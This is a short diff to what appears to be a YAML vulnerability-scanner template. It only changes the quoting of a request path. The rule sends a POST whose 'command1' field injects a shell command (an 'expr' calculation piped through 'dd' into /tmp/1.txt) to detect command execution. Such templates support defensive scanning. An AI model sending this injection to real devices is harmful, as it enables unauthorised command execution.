@@ -4,7 +4,7 @@ set:
   r2: randomInt(1140000, 1144800)
 rules:
   - method: POST
-    path: "/(download)/tmp/1.txt"
+    path: /(download)/tmp/1.txt
     follow_redirects: false
     body: |
       command1=shell%3Aexpr {{r1}} - {{r2}}|dd of=/tmp/1.txt
